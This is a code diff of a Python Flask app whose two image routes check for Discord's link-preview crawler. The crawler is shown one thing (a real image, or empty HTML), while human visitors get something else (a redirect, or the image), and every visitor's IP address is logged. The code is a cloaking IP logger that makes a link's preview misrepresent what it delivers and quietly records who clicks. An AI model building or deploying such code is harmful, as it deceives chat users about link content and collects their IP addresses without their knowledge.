@@ -12,11 +12,11 @@ def conditional_serve():
     ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
     client_ip = ip_header.split(',')[0].strip() if ip_header else 'Unknown IP'
     
-    print(f"[image.png] IP: {client_ip} | UA: {user_agent}", flush=True)
-    
     if "Discordbot" in user_agent:
+        print(f"[LOG] Discord Bot detected | IP: {client_ip} | Serving preview.", flush=True)
         return send_file('actual_image.png', mimetype='image/png')
     else:
+        print(f"[LOG] User browser detected | IP: {client_ip} | Redirecting.", flush=True)
         return redirect("https://wikipedia.org")
 
 @app.route('/image2.png')
@@ -29,11 +29,11 @@ def separate_log_behavior():
     ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
     client_ip = ip_header.split(',')[0].strip() if ip_header else 'Unknown IP'
     
-    print(f"[image2.png] IP: {client_ip} | UA: {user_agent}", flush=True)
-    
     if "Discordbot" in user_agent:
+        print(f"[LOG] Discord Bot detected | IP: {client_ip} | Serving empty HTML.", flush=True)
         return "<html><body></body></html>", 200
     else:
+        print(f"[LOG] User browser detected | IP: {client_ip} | Serving image.", flush=True)
         return send_file('actual_image2.png', mimetype='image/png')
 
 if __name__ == '__main__':
